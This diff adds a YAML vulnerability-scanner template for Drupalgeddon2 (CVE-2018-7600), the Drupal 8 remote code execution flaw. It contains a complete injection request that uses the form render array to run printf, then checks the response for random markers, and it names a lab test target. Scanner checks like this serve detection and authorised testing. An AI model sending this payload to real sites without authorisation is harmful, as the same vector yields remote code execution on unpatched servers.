@@ -1,0 +1,20 @@
+name: poc-yaml-drupal-drupalgeddon2-rce  # nolint[:namematch]
+set:
+  r1: randomLowercase(4)
+  r2: randomLowercase(4)
+rules:
+  - method: POST
+    path: "/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=printf&mail[#type]=markup&mail[#markup]={{r1}}%25%25{{r2}}
+    expression: |
+      response.body.bcontains(bytes(r1 + "%" + r2))
+detail:
+  drupal_version: 8
+  links:
+    - https://github.com/dreadlocked/Drupalgeddon2
+    - https://paper.seebug.org/567/
+test:
+  target: http://cve-2018-7600-8-x.vulnet:8080/
